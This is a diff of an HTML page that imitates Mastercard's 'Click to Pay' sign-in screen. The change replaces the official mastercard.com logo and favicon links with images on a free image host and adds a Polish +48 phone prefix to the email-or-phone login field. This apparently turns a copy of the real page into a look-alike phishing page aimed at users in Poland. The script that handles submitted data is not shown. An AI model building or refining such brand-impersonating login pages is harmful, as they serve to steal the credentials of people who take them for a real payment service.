@@ -1,100 +1,89 @@
 <!DOCTYPE html>
 <html lang="en-US">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-    <meta name="description" content="Create a payment profile or sign in with Click to Pay" />
-    <link rel="icon" href="https://src.mastercard.com/profile/favicon.ico" />
-    <title>Click to Pay</title>
-    <link rel="stylesheet" href="/style.css" />
-  </head>
-  <body>
-    <div class="root-container">
-      <!-- HEADER -->
-      <header class="header__wrapper">
-        <div class="container header__container">
-          <div class="header__brand">
-            <img src="https://src.mastercard.com/profile/static/media/ctpay-logo-dark.3973aefa.svg" alt="Click to Pay" class="logo-ctp" />
-            <img src="https://src.mastercard.com/profile/static/media/mc-logo.4ad6e808.svg" alt="Mastercard" class="logo-mc" />
-          </div>
-          <nav class="header__nav">
-            <a href="#" class="header__item">
-              <span>US</span>
-              <span class="icon-globe" style="color:#000">🌐</span>
-            </a>
-          </nav>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Click to Pay</title>
+  <link rel="stylesheet" href="./style.css" />
+</head>
+<body>
+  <div class="root-container">
+    <header class="header__wrapper">
+      <div class="container header__container">
+        <div class="header__brand">
+          <img src="https://i.ibb.co/qtKtPsZ/image.png" alt="Click to Pay" class="logo-ctp" />
+          <img src="" class="logo-mc" />
         </div>
-      </header>
-
-      <!-- MAIN -->
-      <main class="container">
-        <div class="headline">
-          <h1 class="display-lg color-orange-high">Click to Pay</h1>
-          <h2 class="display-lg">The fast, secure way to pay<br />online</h2>
+        <div class="locale-selector">
+          <a href="#" class="header__item" id="locale-toggle">
+            <span id="current-locale">PL</span>
+            <img src="https://i.ibb.co/fVdgMRB8/image.png" class="icon-globe" />
+          </a>
+          <ul class="locale-dropdown hidden" id="locale-menu">
+            <li data-locale="PL">Polski</li>
+            <li data-locale="EN">English</li>
+            <li data-locale="DE">Deutsch</li>
+          </ul>
         </div>
-
-        <form id="login-form" class="container-fluid" novalidate>
-          <p class="login-intro">Create a profile or sign in</p>
-          <div class="al-input floating">
-            <input
-              type="text"
-              id="userId"
-              name="userId"
-              placeholder="Email or mobile number"
-              class="al-input__input"
-              required
-  	      data-label="Email"
-            />
-	    <span class="al-input__dynamic-label hidden" id="inputLabel">Email</span>
-            <div class="al-input__subtext">
-              Click to Pay will use this information to verify you and may send verification codes to this number.
-              Message/data rates may apply.
-            </div>
-            <div class="al-input__error-icon">❗</div>
-            <div class="al-input__error-text hidden" id="error-required">This field is required</div>
-            <div class="al-input__error-text hidden" id="error-format">Confirm your email and try again</div>
-          </div>
-        </form>
-      </main>
-
-      <!-- BUTTON -->
-      <div class="al-button container fixed-bottom">
-        <button type="submit" id="submit-btn" class="uppercase fill" aria-label="Continue" disabled>
-          <span class="al-button__label">CONTINUE</span>
-        </button>
       </div>
+    </header>
 
-      <!-- LEGAL LINKS -->
-      <footer class="container legal-links fixed-bottom-links">
-        <a href="#" class="legal-link">TERMS</a>
-        <a href="#" class="legal-link">PRIVACY</a>
-        <a href="#" class="legal-link">COOKIES</a>
-        <a href="#" class="legal-link">FEEDBACK</a>
-      </footer>
+<main class="container">
+  <div class="headline">
+    <h1 class="display-lg color-orange-high">Click to Pay</h1>
+    <h2 class="display-lg">The fast, secure way to pay<br />online</h2>
+  </div>
+
+  <form id="login-form" class="container-fluid" novalidate>
+    <p class="login-intro">Create a profile or sign in</p>
+
+   <div class="al-input floating">
+
+     <div class="al-input__inner">
+      <label for="userId" class="al-input__label" id="inputLabel">Email or mobile number</label>
+       <div class="phone-wrapper hidden" id="phone-wrapper">
+         <span class="phone-prefix">PL +48</span>
+         <span class="phone-separator">|</span>
+       </div>
+
+       <input
+         type="text"
+         id="userId"
+         name="userId"
+         class="al-input__input"
+         required
+       />
+
+       <div class="al-input__error-icon">❗</div>
+     </div>
+
+     <div class="al-input__messages">
+       <div id="error-required" class="al-input__error-text hidden">This field is required.</div>
+       <div id="error-format" class="al-input__error-text hidden">Please enter a valid email address.</div>
+       <div id="error-phone" class="al-input__error-text hidden">Phone number must be at least 9 digits.</div>
+       <div id="subtext-info" class="al-input__subtext hidden">
+         Click to Pay will use this information to verify you and may send
+         verification codes to this number. Message/data rates may apply.
+       </div>
+     </div>
+   </div>
+  </form>
+</main>
+
+
+    <div class="al-button container fixed-bottom">
+      <button type="submit" id="submit-btn" class="uppercase fill" aria-label="Continue" disabled>
+        <span class="al-button__label">CONTINUE</span>
+      </button>
     </div>
 
-    <script type="module" src="/src/main.js"></script>
-    <script>
-      const input = document.getElementById('userId');
-      const label = document.getElementById('inputLabel');
-      const errorRequired = document.getElementById('error-required');
-
-      input.addEventListener('focus', () => {
-        input.placeholder = 'Email';
-        label.classList.remove('error');
-      });
-
-      input.addEventListener('blur', () => {
-        if (!input.value.trim()) {
-          label.classList.add('error');
-          errorRequired.classList.remove('hidden');
-        } else {
-          label.classList.remove('error');
-          errorRequired.classList.add('hidden');
-        }
-        input.placeholder = 'Email or mobile number';
-      });
-    </script>
-
-  </body>
+    <footer class="container legal-links fixed-bottom-links">
+      <a href="#" class="legal-link">TERMS</a>
+      <a href="#" class="legal-link">PRIVACY</a>
+      <a href="#" class="legal-link">COOKIES</a>
+      <a href="#" class="legal-link">FEEDBACK</a>
+    </footer>
+  </div>
+  <script type="module" src="/src/main.js"></script>
+</body>
 </html>
